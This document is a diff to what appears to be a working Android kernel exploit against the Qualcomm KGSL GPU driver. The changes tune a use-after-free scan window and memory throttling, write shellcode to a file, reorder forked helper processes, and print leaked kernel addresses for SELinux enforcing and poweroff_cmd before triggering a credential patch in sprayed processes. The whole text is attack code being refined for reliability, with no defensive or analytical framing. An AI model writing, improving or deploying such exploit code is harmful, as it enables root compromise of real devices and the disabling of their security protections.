@@ -42,9 +42,9 @@
 #define UAF_START            0x7001FF000ULL
 #define UAF_SIZE             0x10004000ULL
 #define UAF_SCAN_SIZE        0x04000000ULL
-#define SCAN_PAGE_STEP       2U
-#define SCAN_MAX_PAGES       1024U
-#define SCAN_PROGRESS_EVERY  128U
+#define SCAN_PAGE_STEP       4U
+#define SCAN_MAX_PAGES       4096U
+#define SCAN_PROGRESS_EVERY  512U
 #define OVERLAP_START        0x7001FE000ULL
 #define OVERLAP_SIZE         0x00007000ULL
 #define PLACEH_START         0x710204000ULL
@@ -1735,14 +1735,14 @@ static int find_marker_in_page(uint8_t *page_data, size_t page_size, uint64_t cu
     return 0;
 }
 
-static int scan_uaf_for_nonzero_multi(int fd, void *unused, int *num_found)
+static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
 {
     unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
     uint64_t ib_gpu = 0, dst_gpu = 0;
     void *ib_vma = NULL, *dst_vma = NULL;
     int marker_found = 0;
 
-    fprintf(stderr, "\n[12] SCANNING UAF (FULL PAGE SCAN)\n");
+    fprintf(stderr, "\n[12] SCANNING UAF (Window %d)\n", batch_idx);
 
     struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
     if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) return 0;
@@ -1765,18 +1765,21 @@ static int scan_uaf_for_nonzero_multi(int fd, void *unused, int *num_found)
     ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
     dst_gpu = info.gpuaddr;
 
-    uint64_t current_va = UAF_START;
-    uint64_t end_va = UAF_START + UAF_SCAN_SIZE;
+    // Сдвигаем окно сканирования в зависимости от номера батча
+    uint64_t scan_offset = (batch_idx * 0x800000ULL) % UAF_SIZE; 
+    uint64_t current_va = UAF_START + scan_offset;
+    uint64_t end_va = UAF_START + UAF_SIZE;
     int total_pages_scanned = 0;
     double initial_ram = get_ram_usage_percentage();
 
-    while (current_va < end_va && total_pages_scanned < SCAN_MAX_PAGES && !marker_found)
+    while (total_pages_scanned < SCAN_MAX_PAGES && !marker_found)
     {
+        if (current_va >= end_va) current_va = UAF_START;
+
         double current_ram = get_ram_usage_percentage();
-        // Лимит 70% общего ОЗУ ИЛИ не более +20% к тому, что было до сканирования
         if (current_ram > 70.0 || (current_ram - initial_ram) > 20.0) {
             fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
-            usleep(500000); // Пауза 0.5 сек для разгрузки
+            usleep(1000000); // Пауза 1 сек
             continue; 
         }
 
@@ -1816,7 +1819,11 @@ static int scan_uaf_for_nonzero_multi(int fd, void *unused, int *num_found)
 
         current_va += PAGE_SIZE * SCAN_PAGE_STEP;
         total_pages_scanned++;
-        if (total_pages_scanned % SCAN_PROGRESS_EVERY == 0) { fprintf(stderr, "."); fflush(stderr); }
+        if (total_pages_scanned % SCAN_PROGRESS_EVERY == 0) { 
+            fprintf(stderr, "."); fflush(stderr); 
+            usleep(100000); // Разгружаем GPU/CPU каждые 512 страниц
+        }
+        usleep(1000); // Минимальная пауза между страницами
     }
 
 cleanup:
@@ -2173,37 +2180,6 @@ int main(int argc, char **argv)
     }
     fprintf(stderr, "main pid = %d, main ppid=%d\n", getpid(), getppid());
     gbuf[0x888] = 0;
-
-    int pid = fork();
-    if (!pid)
-    {
-        fprintf(stderr, "[CHILD1] Started\n");
-        int pid2 = fork();
-        if (!pid2)
-        {
-            if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x12, WAIT_TIMEOUT_MS))
-            {
-                fprintf(stderr, "[!] child2 timeout waiting for FOUND_PID=0x12\n");
-                return 1;
-            }
-            sleep(2);
-            gbuf[GBUF_CALL_LOGLINE] = 0x11;
-            fprintf(stderr, "[CHILD2] pid = %d, ppid=%d\n", getpid(), getppid());
-            return 0;
-        }
-        else
-        {
-            if (!wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x11, WAIT_TIMEOUT_MS))
-            {
-                fprintf(stderr, "[!] child1 timeout waiting for FOUND_PID=0x11\n");
-                _exit(1);
-            }
-            fprintf(stderr, "[CHILD1] pid = %d, ppid=%d\n", getpid(), getppid());
-            gbuf[GBUF_FOUND_PID] = 0x12;
-            waitpid(pid2, NULL, 0);
-            _exit(0);
-        }
-    }
 
     fd_shellcode = open("./shellcode", O_RDWR | O_CREAT | O_TRUNC, 0777);
     write(fd_shellcode, shellcode, shellcode_len);
@@ -2567,7 +2543,7 @@ restart:;
                     reached_mem_limit ? "Memory" : "Spray", ram_usage);
             
             int num_found = 0;
-            if (scan_uaf_for_nonzero_multi(fd, NULL, &num_found)) {
+            if (scan_uaf_for_nonzero_multi(fd, total_sprayed / batch_size, &num_found)) {
                 uint64_t leaked_base = find_kernel_base_from_task_va(*(uint64_t *)&gbuf[GBUF_TASK_VA]);
                 if (leaked_base != 0) {
                     kernel_base = leaked_base;
@@ -2660,8 +2636,25 @@ restart:;
     fprintf(stderr, "[+] SELinux enforcing at: 0x%lx\n", (unsigned long)selinux_enforcing);
     fprintf(stderr, "[+] Poweroff cmd at: 0x%lx\n", (unsigned long)poweroff_cmd);
 
-    sleep(1);
     fprintf(stderr, "[child] Triggering cred patch in spray processes...\n");
+    
+    // Spawn background waiters only now
+    int bg_pid = fork();
+    if (!bg_pid) {
+        int pid2 = fork();
+        if (!pid2) {
+            wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x12, WAIT_TIMEOUT_MS);
+            sleep(1);
+            gbuf[GBUF_CALL_LOGLINE] = 0x11;
+            _exit(0);
+        } else {
+            wait_for_flag_u8((volatile uint8_t *)&gbuf[GBUF_FOUND_PID], 0x11, WAIT_TIMEOUT_MS);
+            gbuf[GBUF_FOUND_PID] = 0x12;
+            waitpid(pid2, NULL, 0);
+            _exit(0);
+        }
+    }
+
     gbuf[0] = 0xab;
     gbuf[GBUF_FOUND_PID] = 0x11;
     fprintf(stderr, "[+] Set FOUND_PID=0x11 for child1\n");
